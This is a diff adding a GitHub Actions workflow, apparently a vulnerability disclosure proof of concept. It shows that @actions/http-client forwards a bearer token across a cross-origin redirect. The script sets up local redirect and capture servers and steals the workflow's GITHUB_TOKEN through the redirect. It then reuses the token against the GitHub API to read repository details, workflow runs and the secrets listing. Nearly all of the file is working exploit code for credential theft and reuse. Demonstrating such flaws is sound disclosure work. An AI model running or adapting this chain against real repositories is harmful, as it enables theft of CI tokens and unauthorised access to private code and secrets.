@@ -1,0 +1,110 @@
+name: Full Chain PoC - Credential Leak to Data Access
+on:
+  workflow_dispatch:
+env:
+  TEST_SECRET_VALUE: "CONFIDENTIAL_DATA_12345"
+jobs:
+  full-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Install http-client
+        run: npm init -y > /dev/null && npm install @actions/http-client@4.0.1 > /dev/null 2>&1
+
+      - name: Full chain PoC
+        env:
+          ACTIONS_RUNTIME_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          cat > chain.mjs << 'SCRIPT'
+          import http from "http";
+          import * as httpm from "@actions/http-client";
+          import {BearerCredentialHandler} from "@actions/http-client/lib/auth";
+
+          // Phase 1: Set up capture and redirect servers
+          let capturedToken = null;
+          
+          const captureServer = http.createServer((req, res) => {
+            if (req.headers.authorization) {
+              capturedToken = req.headers.authorization.replace("Bearer ", "");
+              console.log("PHASE 1: Token captured via redirect!");
+              console.log("  Captured token (first 20 chars): " + capturedToken.substring(0, 20) + "...");
+            }
+            res.writeHead(200, {"Content-Type":"application/json"});
+            res.end(JSON.stringify({ok:true}));
+          });
+          
+          const redirectServer = http.createServer((req, res) => {
+            console.log("REDIRECT: localhost -> 127.0.0.1 (cross-domain)");
+            res.writeHead(302, {"Location":"http://127.0.0.1:9998/capture"});
+            res.end();
+          });
+
+          await new Promise(r => captureServer.listen(9998, r));
+          await new Promise(r => redirectServer.listen(9999, r));
+
+          // Phase 2: Trigger the credential leak
+          const token = process.env.ACTIONS_RUNTIME_TOKEN;
+          if (!token) { console.error("No runtime token"); process.exit(1); }
+          
+          console.log("=== Phase 1: Credential Leak via Redirect ===");
+          console.log("Using ACTIONS_RUNTIME_TOKEN with BearerCredentialHandler");
+          
+          const handler = new BearerCredentialHandler(token);
+          const client = new httpm.HttpClient("poc", [handler]);
+          await client.get("http://localhost:9999/trigger");
+          
+          if (!capturedToken) {
+            console.log("Token NOT captured - vulnerability may be fixed");
+            process.exit(1);
+          }
+
+          // Phase 3: Use captured token to access GitHub API
+          console.log("");
+          console.log("=== Phase 2: Use Captured Token for Data Access ===");
+          
+          const apiClient = new httpm.HttpClient("attacker");
+          const repoUrl = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}`;
+          
+          // Test 1: Read repo info with captured token
+          const repoRes = await apiClient.get(repoUrl, {
+            "Authorization": `token ${capturedToken}`,
+            "Accept": "application/vnd.github+json"
+          });
+          const repo = JSON.parse(await repoRes.readBody());
+          console.log("DATA ACCESS with captured token:");
+          console.log("  Repo: " + (repo.full_name || "FAILED"));
+          console.log("  Private: " + repo.private);
+          
+          // Test 2: Read workflow runs
+          const runsRes = await apiClient.get(`${repoUrl}/actions/runs?per_page=1`, {
+            "Authorization": `token ${capturedToken}`,
+            "Accept": "application/vnd.github+json"
+          });
+          const runs = JSON.parse(await runsRes.readBody());
+          console.log("  Workflow runs accessible: " + (runs.total_count || 0));
+          
+          // Test 3: Can we read secrets list?
+          const secretsRes = await apiClient.get(`${repoUrl}/actions/secrets`, {
+            "Authorization": `token ${capturedToken}`,
+            "Accept": "application/vnd.github+json"
+          });
+          const secretsBody = await secretsRes.readBody();
+          console.log("  Secrets API status: " + secretsRes.message.statusCode);
+          if (secretsRes.message.statusCode === 200) {
+            const secrets = JSON.parse(secretsBody);
+            console.log("  Secrets accessible: " + secrets.total_count);
+          }
+          
+          console.log("");
+          console.log("=== FULL CHAIN PROVEN ===");
+          console.log("Credential leak -> Token capture -> GitHub API data access");
+          
+          captureServer.close();
+          redirectServer.close();
+          process.exit(0);
+          SCRIPT
+          
+          node chain.mjs
